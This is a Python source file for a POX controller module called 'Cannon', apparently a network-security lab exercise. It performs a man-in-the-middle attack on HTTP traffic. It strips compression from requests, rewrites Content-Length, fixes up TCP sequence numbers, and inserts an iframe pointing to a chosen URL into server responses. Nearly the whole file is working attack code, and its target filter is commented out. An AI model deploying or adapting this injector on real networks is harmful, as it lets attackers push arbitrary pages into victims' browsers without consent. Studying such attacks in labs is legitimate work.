from pox.lib.packet.ipv4 import ipv4
import re

class Cannon(object):

    def __init__ (self, target_domain_re, url_path_re, iframe_url):
        self.target_domain_re = target_domain_re
        self.url_path_re = url_path_re
        self.iframe_url = iframe_url
        # ! connection map
        self.connMap = {}

    # Input: an instance of ipv4 class
    # Output: an instance of ipv4 class or None
    def manipulate_packet (self, ip_packet):
        # print "src = ", ip_packet.srcip
    	# print "dst = ", ip_packet.dstip
        print ''
        # ! only care about HTTP (tcp)
        tcp = ip_packet.find('tcp')
        if not tcp:
            return ip_packet

        # * get tcp content
        tcpContent = tcp.payload
        
        # * tuple to map connections
        req = (ip_packet.srcip,  tcp.srcport, ip_packet.dstip, tcp.dstport)
        res = (ip_packet.dstip, tcp.dstport, ip_packet.srcip,  tcp.srcport)
        # * create new connection entry if not exist
        # * first request always initiated by the client
        if not req in self.connMap.keys():
            self.connMap[req] = { 'ack': 0, 'seq': 0, 'role': 'client', 'target': False }
            self.connMap[res] = { 'ack': 0, 'seq': 0, 'role': 'server', 'target': False }
          
        
        
        # ! the current request is always represented by the req tuple 
        # ! adjust ack and seq
        tcp.ack = (tcp.ack + self.connMap[req]['ack']) % 2**32
        tcp.seq = (tcp.seq + self.connMap[req]['seq']) %  2**32
        print 'ack: ' + str(tcp.ack)
        print 'seq: ' + str(tcp.seq)
        
        
        # ! case 1: is request
        # todo what if the client request is out of order
        if bool(re.match('^GET\s+.+', tcpContent)):
            # * get domain and url path
            domain = tcpContent[tcpContent.find("Host: ")+6 : tcpContent.find("\r\n", tcpContent.find("Host: "))]
            url = tcpContent[tcpContent.find("GET ")+4 : tcpContent.find("HTTP", tcpContent.find("GET "))-1]
            
            domainMatch = bool(self.target_domain_re.search(domain))
            pathMatch = bool(self.url_path_re.search(url))
            
            # todo remove comment
            # if not (domainMatch & pathMatch):
            #     return ip_packet
            
            # * if Accept-Encoding is already there
            if "Accept-Encoding: " in tcpContent:
                start = tcpContent.find("Accept-Encoding: ") + 17
                end = tcpContent.find("\r\n", start)
                # print "packet: " + tcpContent[start:end]
                
                tcpContent = tcpContent.replace(tcpContent[start : end], "identity")
                tcp.payload = tcpContent
                
                offset = 8 - (end - start) # * length of "identity" = 8
                self.connMap[res]['ack'] += 0 - offset
                self.connMap[req]['seq'] += offset
                self.connMap[res]['target'] = True
                self.connMap[req]['target'] = True
                print 'ack offset: ' + str(self.connMap[res]['ack'])
                print 'seq offset: ' + str(self.connMap[req]['seq'])
                print 'ack: ' + str(tcp.ack)
                print 'seq: ' + str(tcp.seq)
                return ip_packet
            # else:
            #     noCompress = "Accept-Encoding: identity"
            #     headers = tcpContent.split('\r\n')
            #     headers.insert(len(headers)/2, noCompress)
            #     tcpContent = '\r\n'.join(headers)
            #     tcp.payload = tcpContent
                
                  
        # ! case 2: if the packet is from the server and the site is a target
        # ! the current request is always represented by the req tuple 
        if (self.connMap[req]['role'] == 'server') & self.connMap[req]['target']:    
            # * replace content-length if exists
            if "Content-Length: " in tcpContent:
                start = tcpContent.find("Content-Length: ") + len("Content-Length: ")
                end = tcpContent.find("\r\n", start)
                print "length: " + tcpContent[start:end]
                
                oldLen = int(tcpContent[start:end])
                newLen = oldLen + len('<iframe src="' + self.iframe_url + '"><\iframe>')
                offset =  len(str(newLen)) - len(str(oldLen))
                tcpContent = tcpContent.replace(tcpContent[start : end], str(newLen))
                tcp.payload = tcpContent
                self.connMap[res]['ack'] += 0 - offset
                self.connMap[req]['seq'] += offset
                # print 'ack offset: ' + str(self.connMap[res]['ack'])
                # print 'seq offset: ' + str(self.connMap[req]['seq'])
                # print 'ack: ' + str(tcp.ack)
                # print 'seq: ' + str(tcp.seq)
                return ip_packet
            
            
            if '</body>' in tcpContent:
                # * inject iframe
                iframe = '<iframe src="' + self.iframe_url + '"><\iframe></body>'
                offset = len(iframe) - len('</body>')
                tcpContent = tcpContent.replace('</body>', iframe)
                tcp.payload = tcpContent
                self.connMap[res]['ack'] += 0 - offset
                self.connMap[req]['seq'] += offset
                return ip_packet
        
    	# Must return an ip packet or None
    	return ip_packet


